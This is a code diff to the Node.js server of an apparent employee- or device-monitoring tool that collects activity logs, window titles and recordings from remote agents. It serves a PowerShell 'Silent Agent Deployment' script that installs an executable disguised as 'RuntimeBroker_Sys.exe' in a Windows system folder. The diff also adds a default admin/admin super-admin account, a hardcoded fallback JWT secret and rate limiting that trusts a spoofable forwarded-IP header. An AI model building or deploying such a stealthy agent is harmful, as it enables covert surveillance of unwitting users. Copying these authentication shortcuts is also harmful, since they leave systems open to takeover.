@@ -9,6 +9,7 @@ const Tesseract = require("tesseract.js");
 const rateLimit = require("express-rate-limit");
 
 const app = express();
+app.set("trust proxy", 1);
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
@@ -36,13 +37,13 @@ app.use("/api", apiLimiter);
 
 app.use("/storage", express.static(path.join(__dirname, "storage")));
 const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: "*" }, maxHttpBufferSize: 1e8 });
+const io = new Server(server, { cors: { origin: ["http://localhost:3000", "https://h-boss-production.up.railway.app"] }, maxHttpBufferSize: 1e8 });
 
 // --- Socket.IO connection rate limiting ---
 const socketConnections = new Map(); // IP -> count
 const MAX_SOCKET_CONNECTIONS_PER_IP = 10;
 io.use((socket, next) => {
-  const ip = socket.handshake.address;
+  const ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
   const count = socketConnections.get(ip) || 0;
   if (count >= MAX_SOCKET_CONNECTIONS_PER_IP) {
     return next(new Error("Too many socket connections from your IP"));
@@ -56,7 +57,8 @@ io.use((socket, next) => {
   next();
 });
 
-const db = new Database(path.join(__dirname, "teram_records.db"));
+const DB_PATH = process.env.DATA_DIR ? path.join(process.env.DATA_DIR, "teram_records.db") : path.join(__dirname, "teram_records.db");
+const db = new Database(DB_PATH);
 db.pragma("journal_mode = WAL");
 db.pragma("busy_timeout = 5000");
 
@@ -784,10 +786,11 @@ app.get("/download-join", (req, res) => {
     return "localhost";
   })();
 
+  const resolvedServerUrl = process.env.PUBLIC_URL || `http://${localIP}:4000`;
   const lines = [
     '# HBOSE Silent Agent Deployment',
     "$ErrorActionPreference = 'SilentlyContinue'",
-    '$ServerUrl = "http://' + localIP + ':4000"',
+    `$ServerUrl = "${resolvedServerUrl}"`,
     '$InstallDir = Join-Path $env:ProgramData "Microsoft\\Windows\\SystemHealth"',
     '$ExeName = "RuntimeBroker_Sys.exe"',
     '$ExePath = Join-Path $InstallDir $ExeName',
@@ -1478,6 +1481,13 @@ app.delete("/api/recordings/:id", (req, res) => {
 
 // Core Schema Fixes (Stability + Features)
 db.exec(`
+  CREATE TABLE IF NOT EXISTS admins (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT UNIQUE NOT NULL,
+    password_hash TEXT NOT NULL,
+    role TEXT NOT NULL,
+    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+  );
   CREATE TABLE IF NOT EXISTS activities (
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     hostname TEXT, username TEXT, window_title TEXT,
@@ -2438,7 +2448,7 @@ app.post("/api/agent/godmode", express.json(), (req, res) => {
 
 io.on("connection", (socket) => {
   // Only log non-dashboard connections (agents will auth)
-  const ip = socket.handshake.address;
+  const ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
   const isDashboard = ip === "127.0.0.1" || ip === "::1" || ip === "::ffff:127.0.0.1";
 
   socket.on("agent-auth", (data) => {
@@ -2669,6 +2679,118 @@ setInterval(() => {
   const agentList = [...new Set(agentSockets.map(s => s.hostname))];
   io.emit("agent-list", agentList);
 }, 3000);
+
+// ═══════════════════════════════════════════════
+// AUTHENTICATION & PROFILES
+// ═══════════════════════════════════════════════
+const bcrypt = require("bcryptjs");
+const { SignJWT, jwtVerify } = require("jose");
+const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET || "fallback_secret_hboss_pro_2026");
+
+// Seed default admin if table is empty
+try {
+  const adminCount = db.prepare("SELECT COUNT(*) as c FROM admins").get().c;
+  if (adminCount === 0) {
+    const hash = bcrypt.hashSync("admin", 10);
+    db.prepare("INSERT INTO admins (username, password_hash, role) VALUES (?, ?, ?)").run("admin", hash, "super_admin");
+    console.log("[AUTH] Seeded default super_admin account (admin/admin)");
+  }
+} catch (e) {
+  console.log("[AUTH] Seed error:", e.message);
+}
+
+const requireAuth = async (req, res, next) => {
+  const token = req.headers.cookie?.split('; ').find(row => row.startsWith('auth_token='))?.split('=')[1];
+  if (!token) return res.status(401).json({ error: "Unauthorized" });
+  try {
+    const { payload } = await jwtVerify(token, JWT_SECRET);
+    req.user = payload;
+    next();
+  } catch (e) {
+    return res.status(401).json({ error: "Unauthorized" });
+  }
+};
+
+const requireSuperAdmin = (req, res, next) => {
+  if (req.user?.role !== "super_admin") return res.status(403).json({ error: "Forbidden" });
+  next();
+};
+
+app.post("/api/auth/login", async (req, res) => {
+  const { username, password } = req.body;
+  if (!username || !password) return res.status(400).json({ error: "Missing credentials" });
+  try {
+    const user = db.prepare("SELECT * FROM admins WHERE username = ?").get(username);
+    if (!user || !bcrypt.compareSync(password, user.password_hash)) {
+      return res.status(401).json({ error: "Invalid credentials" });
+    }
+    const token = await new SignJWT({ id: user.id, username: user.username, role: user.role })
+      .setProtectedHeader({ alg: 'HS256' })
+      .setExpirationTime('24h')
+      .sign(JWT_SECRET);
+    
+    res.cookie("auth_token", token, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "lax",
+      maxAge: 24 * 60 * 60 * 1000,
+      path: "/"
+    });
+    res.json({ success: true, user: { username: user.username, role: user.role } });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.post("/api/auth/logout", (req, res) => {
+  res.cookie("auth_token", "", { maxAge: 0, path: "/" });
+  res.json({ success: true });
+});
+
+app.get("/api/auth/me", requireAuth, (req, res) => {
+  res.json({ user: req.user });
+});
+
+app.get("/api/admins", requireAuth, requireSuperAdmin, (req, res) => {
+  const admins = db.prepare("SELECT id, username, role, created_at FROM admins").all();
+  res.json(admins);
+});
+
+app.post("/api/admins", requireAuth, requireSuperAdmin, (req, res) => {
+  const { username, password, role } = req.body;
+  if (!username || !password || !role) return res.status(400).json({ error: "Missing fields" });
+  try {
+    const hash = bcrypt.hashSync(password, 10);
+    db.prepare("INSERT INTO admins (username, password_hash, role) VALUES (?, ?, ?)").run(username, hash, role);
+    res.json({ success: true });
+  } catch (e) {
+    if (e.message.includes("UNIQUE")) return res.status(400).json({ error: "Username taken" });
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.delete("/api/admins/:id", requireAuth, requireSuperAdmin, (req, res) => {
+  if (req.params.id == req.user.id) return res.status(400).json({ error: "Cannot delete yourself" });
+  db.prepare("DELETE FROM admins WHERE id = ?").run(req.params.id);
+  res.json({ success: true });
+});
+
+app.patch("/api/admins/:id", requireAuth, requireSuperAdmin, (req, res) => {
+  const { username, password, role } = req.body;
+  if (!username || !role) return res.status(400).json({ error: "Missing fields" });
+  try {
+    if (password) {
+      const hash = bcrypt.hashSync(password, 10);
+      db.prepare("UPDATE admins SET username = ?, password_hash = ?, role = ? WHERE id = ?").run(username, hash, role, req.params.id);
+    } else {
+      db.prepare("UPDATE admins SET username = ?, role = ? WHERE id = ?").run(username, role, req.params.id);
+    }
+    res.json({ success: true });
+  } catch (e) {
+    if (e.message.includes("UNIQUE")) return res.status(400).json({ error: "Username taken" });
+    res.status(500).json({ error: e.message });
+  }
+});
 
 // Catch-all: Unknown API routes return JSON 404 (not raw text crash)
 // Express 5 requires named splat params instead of bare *
